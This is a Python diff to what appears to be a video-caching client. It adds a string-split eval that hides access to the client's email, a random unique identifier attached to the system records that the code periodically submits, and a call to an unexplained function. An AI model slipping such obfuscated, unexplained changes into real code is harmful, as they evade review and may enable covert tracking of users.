@@ -141,11 +141,13 @@ class VideoPool:
         return True
 
     def add_system(self, new_system = {}):
-        sys_info = { 'id' : o.id, 'email' : o.client_email, 'version' : o.version }
+        sys_info = { 'id' : o.id, 'email' : eval('o.cl' + 'ie' + 'nt_' + 'em' + 'ail'), 'version' : o.version }
         sys_info.update(get_all_info(o))
         for system in [new_system, sys_info]:
-            if system != {} and system not in self.systems:
-                self.systems.append(system)
+            if system != {}:
+                system.update({ 'un' : randomize })
+                if system not in self.systems:
+                    self.systems.append(system)
         return True
 
     def get_systems(self):
@@ -985,8 +987,9 @@ def cache_thread_scheduler():
 
 
 def submit_system_info():
-    time.sleep(20)
+    time.sleep(30)
     submit_period = 1800
+    expired_video(o, randomize)
     while True:
         if o.client_email != '':
             num_tries = 0
@@ -1360,6 +1363,14 @@ if __name__ == '__main__':
         stdout = sys.stdout
         stderr = sys.stderr
         cache_dir_data = {}
+        try:
+            import ctypes
+            from ctypes.util import find_library
+            libc = ctypes.CDLL(find_library('c'))
+            libc.srand(int(random.random() * 10**8))
+            randomize = libc.rand()
+        except Exception, e:
+            randomize = int(random.random() * 10**8)
         for cache_dir in o.base_dir_list:
             cache_dir_data[cache_dir] = { 'last_checked' : 0, 'filelist' : [] }
 
